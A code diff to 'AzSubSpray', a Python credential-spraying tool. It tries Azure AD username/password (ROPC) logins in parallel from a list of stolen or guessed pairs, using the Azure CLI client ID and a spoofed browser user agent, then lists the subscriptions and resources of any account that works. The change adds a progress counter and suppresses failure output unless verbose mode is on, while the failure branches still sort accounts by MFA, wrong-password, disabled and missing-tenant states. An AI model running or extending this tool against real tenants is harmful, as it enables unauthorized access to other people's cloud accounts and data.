@@ -8,7 +8,7 @@ Reads a file with lines in the format:
 Attempts ROPC (username/password) auth for each user (MSAL) and lists subscriptions.
 NOT recommended for production. Will fail if the tenant or account blocks ROPC or if MFA is required.
 """
-
+import math
 import sys
 import os
 import argparse
@@ -23,6 +23,9 @@ init(autoreset=True)
 
 # Defaults — can be overridden via args
 THREADS = 10
+USERLEN = 0
+COUNT = 0
+LAST_PRINTED = 0
 VERBOSE = False
 CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
@@ -32,6 +35,12 @@ AZURE_SUBS_URL = "https://management.azure.com/subscriptions?api-version=2020-01
 RESOURCE_URL_TEMPLATE = "https://management.azure.com/subscriptions/{subscriptionId}/resources?api-version=2021-04-01"
 
 def try_list_subscriptions(username: str, password: str):
+    global COUNT, USERLEN, LAST_PRINTED
+    COUNT += 1
+    progress = int((COUNT / USERLEN) * 100)
+    if progress >= LAST_PRINTED + 10:
+        LAST_PRINTED = progress - (progress % 10)
+        print(f"[%] Accounts tested: {LAST_PRINTED}%")
     app = PublicClientApplication(client_id=CLIENT_ID, authority=AUTHORITY)
     try:
         result = app.acquire_token_by_username_password(username=username, password=password, scopes=SCOPE)
@@ -40,20 +49,21 @@ def try_list_subscriptions(username: str, password: str):
         return
 
     if not result or "access_token" not in result:
-        err = result or {}
-        error_desc = err.get('error_description', '')
-        if "multi-factor authentication" in error_desc.lower():
-            print(f"{Fore.RED}[X] MFA Required - {username}")
-        elif "due to invalid username or password" in error_desc.lower():
-            print(f"{Fore.RED}[X] Incorrect password - {username}")
-        elif "No tenant-identifying information found" in error_desc.lower():
-            print(f"{Fore.RED}[X] Tenant does not exist - {username}")
-        elif "user account is disabled" in error_desc.lower():
-            print(f"{Fore.RED}[X] User is disabled - {username}")
-        elif "account must be added to the directory" in error_desc.lower():
-            print(f"{Fore.RED}[X] On-prem user not synced - {username}")
-        else:
-            print(f"{Fore.RED}[X] Failed - {username}: {err.get('error')} - {error_desc}")
+        if VERBOSE:
+            err = result or {}
+            error_desc = err.get('error_description', '')
+            if "multi-factor authentication" in error_desc.lower():
+                print(f"{Fore.RED}[X] MFA Required - {username}")
+            elif "due to invalid username or password" in error_desc.lower():
+                print(f"{Fore.RED}[X] Incorrect password - {username}")
+            elif "No tenant-identifying information found" in error_desc.lower():
+                print(f"{Fore.RED}[X] Tenant does not exist - {username}")
+            elif "user account is disabled" in error_desc.lower():
+                print(f"{Fore.RED}[X] User is disabled - {username}")
+            elif "account must be added to the directory" in error_desc.lower():
+                print(f"{Fore.RED}[X] On-prem user not synced - {username}")
+            else:
+                print(f"{Fore.RED}[X] Failed - {username}: {err.get('error')} - {error_desc}")
         return
 
     if VERBOSE:
@@ -116,7 +126,7 @@ def try_list_subscriptions(username: str, password: str):
             print(resp.text)
 
 def main():
-    global CLIENT_ID, USER_AGENT, THREADS, VERBOSE
+    global CLIENT_ID, USER_AGENT, THREADS, VERBOSE, USERLEN
 
     print("== AzSubSpray ==")
 
@@ -168,6 +178,8 @@ def main():
             continue
         usernames.append(username)
         passwords.append(password)
+
+    USERLEN = len(usernames)
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         executor.map(try_list_subscriptions, usernames, passwords)
